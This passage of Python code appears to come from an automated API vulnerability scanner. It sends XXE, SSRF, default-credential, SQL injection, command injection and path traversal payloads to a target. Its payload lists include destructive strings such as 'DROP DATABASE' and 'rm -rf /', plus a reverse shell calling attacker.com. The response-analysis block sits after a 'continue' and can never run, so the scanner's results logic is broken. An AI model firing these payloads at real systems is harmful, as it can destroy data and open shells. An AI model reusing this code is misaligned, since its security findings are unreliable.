                        metadata_vulns.append("METADATA_LEAKAGE: Sensitive metadata exposed in response")
                    
                    # Check headers for metadata
                    sensitive_headers = ['server', 'x-powered-by', 'x-aspnet-version', 'x-runtime']
                    for header in sensitive_headers:
                        if header in resp.headers:
                            metadata_vulns.append(f"METADATA_LEAKAGE: {header} header exposed")
                    
                except Exception as e:
                    pass
                
                if metadata_vulns:
                    vulnerabilities['medium'].extend(metadata_vulns)
                progress.complete_check(f"Running {check}...", "complete")
            
            elif check == 'open_endpoints':
                # Open endpoints check
                open_endpoint_vulns = []
                
                # Test common open endpoints
                open_endpoints = ['/api', '/api/v1', '/api/v2', '/rest', '/graphql', '/swagger', '/docs', '/openapi']
                
                for endpoint in open_endpoints:
                    try:
                        test_url = api_url.rstrip('/') + endpoint
                        test_resp = req_func(test_url, headers=headers)
                        
                        if test_resp and test_resp.status_code in [200, 201]:
                            open_endpoint_vulns.append(f"OPEN_ENDPOINT: {endpoint} | Endpoint accessible without authentication")
                        
                    except Exception as e:
                        continue
                
                if open_endpoint_vulns:
                    vulnerabilities['critical'].extend(open_endpoint_vulns)
                progress.complete_check(f"Running {check}...", "complete")
            
            elif check == 'xxe':
                # XXE (XML External Entity) check
                xxe_vulns = []
                
                xxe_payloads = [
                    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>',
                    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "http://attacker.com/evil">]><test>&xxe;</test>',
                    '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><test>&xxe;</test>'
                ]
                
                for payload in xxe_payloads:
                    try:
                        headers_with_xml = headers.copy()
                        headers_with_xml['Content-Type'] = 'application/xml'
                        test_resp = req_func(api_url, headers=headers_with_xml, data=payload)
                        
                        if test_resp and ('root:' in test_resp.text or 'windows' in test_resp.text.lower()):
                            xxe_vulns.append(f"XXE_VULNERABILITY: {payload[:50]}... | XML External Entity injection detected")
                        
                    except Exception as e:
                        continue
                
                if xxe_vulns:
                    vulnerabilities['critical'].extend(xxe_vulns)
                progress.complete_check(f"Running {check}...", "complete")
            
            elif check == 'ssrf':
                # SSRF (Server-Side Request Forgery) check
                ssrf_vulns = []
                
                ssrf_payloads = [
                    'http://localhost:22',
                    'http://127.0.0.1:3306',
                    'http://169.254.169.254/latest/meta-data/',
                    'http://metadata.google.internal/',
                    'http://169.254.169.254/latest/dynamic/instance-identity/document'
                ]
                
                for payload in ssrf_payloads:
                    try:
                        # Test URL parameters
                        test_url = api_url + ("&" if "?" in api_url else "?") + f"url={quote(payload)}"
                        ssrf_resp = req_func(test_url, headers=headers)
                        
                        if ssrf_resp and ('ssh' in ssrf_resp.text.lower() or 'mysql' in ssrf_resp.text.lower() or 'aws' in ssrf_resp.text.lower()):
                            ssrf_vulns.append(f"SSRF_VULNERABILITY: {payload} | Server-Side Request Forgery detected")
                        
                    except Exception as e:
                        continue
                
                if ssrf_vulns:
                    vulnerabilities['critical'].extend(ssrf_vulns)
                progress.complete_check(f"Running {check}...", "complete")
            
            elif check == 'auth_bypass':
                # Authentication bypass check
                auth_bypass_vulns = []
                
                bypass_payloads = [
                    'admin',
                    'admin:admin',
                    'admin:password',
                    'user:user',
                    'test:test',
                    'guest:guest',
                    'anonymous:anonymous'
                ]
                
                for payload in bypass_payloads:
                    try:
                        # Test basic auth bypass
                        headers_with_auth = headers.copy()
                        import base64
                        auth_header = base64.b64encode(payload.encode()).decode()
                        headers_with_auth['Authorization'] = f'Basic {auth_header}'
                        
                        test_resp = req_func(api_url, headers=headers_with_auth)
                        
                        if test_resp and test_resp.status_code == 200:
                            auth_bypass_vulns.append(f"AUTH_BYPASS: {payload} | Authentication bypass successful")
                        
                    except Exception as e:
                        continue
                
                if auth_bypass_vulns:
                    vulnerabilities['critical'].extend(auth_bypass_vulns)
                progress.complete_check(f"Running {check}...", "complete")
            
            # Add more checks as needed...
            
        except Exception as e:
            print(f"⚠️  Error in {check}: {e}")
            continue
    
    progress.complete_check("Security scan", "complete")
    
    # Collect security layer information from actual vulnerability checks
    security_layer_info = {
        'waf_detected': False,
        'rate_limiting_detected': False,
        'auth_blocks_detected': False,
        'captcha_detected': False,
        'challenge_detected': False,
        'blocked_requests': [],
        'security_layers': [],
        'attack_blocks': {
            'sql_injection': [],
            'xss': [],
            'command_injection': [],
            'path_traversal': [],
            'auth_bypass': [],
            'banking_attacks': []
        }
    }
    
    # Test comprehensive malicious payloads to detect security layers
    comprehensive_test_payloads = [
        # High-priority SQL Injection payloads (known to trigger WAF blocks)
        ("'; DROP TABLE users;--", "sql_injection"),
        ("1' OR '1' = '1'--", "sql_injection"),
        ("'; DELETE FROM users;--", "sql_injection"),
        ("'; DROP DATABASE;--", "sql_injection"),
        ("' UNION SELECT password FROM users--", "sql_injection"),
        ("'; EXEC xp_cmdshell('dir');--", "sql_injection"),
        ("'; SHUTDOWN;--", "sql_injection"),
        
        # Medium-priority SQL Injection payloads
        ("' OR 1=1--", "sql_injection"),
        ("' UNION SELECT version(),database(),user()--", "sql_injection"),
        ("admin'--", "sql_injection"),
        ("' OR 'x'='x", "sql_injection"),
        
        # XSS payloads
        ("<script>alert('xss')</script>", "xss"),
        ("<img src=x onerror=alert('xss')>", "xss"),
        ("javascript:alert('xss')", "xss"),
        ("<svg onload=alert('xss')>", "xss"),
        ("'><script>alert('xss')</script>", "xss"),
        
        # Command Injection payloads
        ("; ls -la", "command_injection"),
        ("| whoami", "command_injection"),
        ("& cat /etc/passwd", "command_injection"),
        ("; rm -rf /", "command_injection"),
        ("| nc -e /bin/sh attacker.com 4444", "command_injection"),
        
        # Path Traversal payloads
        ("../../../etc/passwd", "path_traversal"),
        ("..\\..\\..\\windows\\win.ini", "path_traversal"),
        ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "path_traversal"),
        ("....//....//....//etc/passwd", "path_traversal"),
        
        # Auth Bypass payloads
        ("admin:admin", "auth_bypass"),
        ("admin:password", "auth_bypass"),
        ("user:user", "auth_bypass"),
        ("' OR 1=1 LIMIT 1--", "auth_bypass"),
        
        # Banking-specific payloads
        ('{"amount": -1000, "to_account": "1234567890"}', "banking_attacks"),
        ('{"promo_code": "FIRST50", "user_id": "new_user_123"}', "banking_attacks"),
        ('{"user_id": "admin", "role": "super_admin"}', "banking_attacks"),
        ('{"transaction_type": "transfer", "amount": 999999}', "banking_attacks")
    ]
    
    print("\n🔍 Testing Security Layer Detection...")
    print(f"   📊 Total payloads to test: {len(comprehensive_test_payloads)}")
    
    # Track statistics for better analysis
    total_payloads = len(comprehensive_test_payloads)
    blocked_payloads = 0
    payload_results = {}
    
    for payload, attack_type in comprehensive_test_payloads:
        try:
            # Test payload in URL parameter for GET requests, or in body for POST/PUT
            if method == "GET":
                # Add payload as URL parameter
                separator = "&" if "?" in api_url else "?"
                test_url = f"{api_url}{separator}test={quote(payload)}"
                print(f"   🔗 Testing GET: {test_url[:100]}...")
                test_resp = req_func(test_url, headers=headers, data=data)
            else:
                # For POST/PUT, add payload to request body
                print(f"   📤 Testing {method}: {payload[:30]}...")
                test_resp = req_func(api_url, headers=headers, data=payload)
            
            if test_resp:
                # Debug output
                print(f"   🧪 Testing {attack_type}: {payload[:30]}... (Status: {test_resp.status_code})")
                
                security_results = security_detector.detect_security_layers(test_resp, payload)
            else:
                print(f"   🛡️ WAF BLOCKED {attack_type}: {payload[:30]}...")
                # Treat failed requests as WAF blocks
                blocked_payloads += 1
                payload_blocked = True
                
                # Add to blocked requests
                security_layer_info['blocked_requests'].append({
                    'payload': payload,
                    'layer_type': 'waf',
                    'block_reason': 'Request blocked by WAF (connection failed)',
                    'confidence': 0.9,
                    'attack_type': attack_type
                })
                
                # Add to attack-specific blocks
                if attack_type in security_layer_info['attack_blocks']:
                    security_layer_info['attack_blocks'][attack_type].append({
                        'payload': payload,
                        'layer_type': 'waf',
                        'block_reason': 'Request blocked by WAF (connection failed)',
                        'confidence': 0.9
                    })
                
                # Update layer detection flags
                security_layer_info['waf_detected'] = True
                
                # Add to security layers if not already present
                layer_exists = any(layer['type'] == 'waf' for layer in security_layer_info['security_layers'])
                if not layer_exists:
                    security_layer_info['security_layers'].append({
                        'type': 'waf',
                        'confidence': 0.9,
                        'block_reason': 'Request blocked by WAF (connection failed)'
                    })
                
                continue
                payload_blocked = False
                
                for result in security_results:
                    if result.is_blocked:
                        payload_blocked = True
                        blocked_payloads += 1
                        
                        # Add to general blocked requests
                        security_layer_info['blocked_requests'].append({
                            'payload': payload,
                            'layer_type': result.layer_type,
                            'block_reason': result.block_reason,
                            'confidence': result.confidence,
                            'attack_type': attack_type
                        })
                        
                        # Add to attack-specific blocks
                        if attack_type in security_layer_info['attack_blocks']:
                            security_layer_info['attack_blocks'][attack_type].append({
                                'payload': payload,
                                'layer_type': result.layer_type,
                                'block_reason': result.block_reason,
                                'confidence': result.confidence
                            })
                        
                        # Update layer detection flags with improved logic
                        if result.layer_type == 'waf':
                            security_layer_info['waf_detected'] = True
                        elif result.layer_type == 'rate_limit':
                            security_layer_info['rate_limiting_detected'] = True
                        elif result.layer_type == 'auth_block':
                            security_layer_info['auth_blocks_detected'] = True
                        elif result.layer_type == 'captcha':
                            security_layer_info['captcha_detected'] = True
                        elif result.layer_type == 'challenge':
                            security_layer_info['challenge_detected'] = True
                        
                        # Add to security layers if not already present
                        layer_exists = any(layer['type'] == result.layer_type for layer in security_layer_info['security_layers'])
                        if not layer_exists:
                            security_layer_info['security_layers'].append({
                                'type': result.layer_type,
                                'confidence': result.confidence,
                                'block_reason': result.block_reason
                            })
                        
                        print(f"   🛡️ {result.layer_type.upper()} blocked {attack_type}: {payload[:30]}...")
                
                # Track payload results for analysis
                payload_results[payload] = {
                    'blocked': payload_blocked,
                    'attack_type': attack_type,
                    'status_code': test_resp.status_code,
                    'response_length': len(test_resp.text)
                }
                
        except Exception as e:
            continue
    
    # Enhanced analysis: detect partial WAF protection
    if blocked_payloads > 0:
        block_percentage = (blocked_payloads / total_payloads) * 100
        print(f"   📊 Security Layer Statistics: {blocked_payloads}/{total_payloads} payloads blocked ({block_percentage:.1f}%)")
        
        # If some but not all payloads are blocked, it's partial protection
        if 0 < blocked_payloads < total_payloads:
            print(f"   ⚠️ Partial security protection detected - some attack patterns bypass security layers")
            
            # Add partial protection info to security layers
            for layer in security_layer_info['security_layers']:
                layer['partial_protection'] = True
                layer['block_rate'] = f"{block_percentage:.1f}%"
        
        # Analyze which attack types are most/least protected
        attack_type_blocks = {}
        for payload, result in payload_results.items():
            attack_type = result['attack_type']
            if attack_type not in attack_type_blocks:
                attack_type_blocks[attack_type] = {'blocked': 0, 'total': 0}
            attack_type_blocks[attack_type]['total'] += 1
            if result['blocked']:
                attack_type_blocks[attack_type]['blocked'] += 1
        
        print(f"   🔍 Attack Type Protection Analysis:")
        for attack_type, stats in attack_type_blocks.items():
            protection_rate = (stats['blocked'] / stats['total']) * 100
            print(f"      {attack_type}: {stats['blocked']}/{stats['total']} blocked ({protection_rate:.1f}%)")
    else:
        print(f"   ℹ️ No security blocks detected from {total_payloads} test payloads")
    
    # Add security layer info to findings
    findings = {
        'vulnerabilities': vulnerabilities,
        'security_layers': security_layer_info
    }
    
    return findings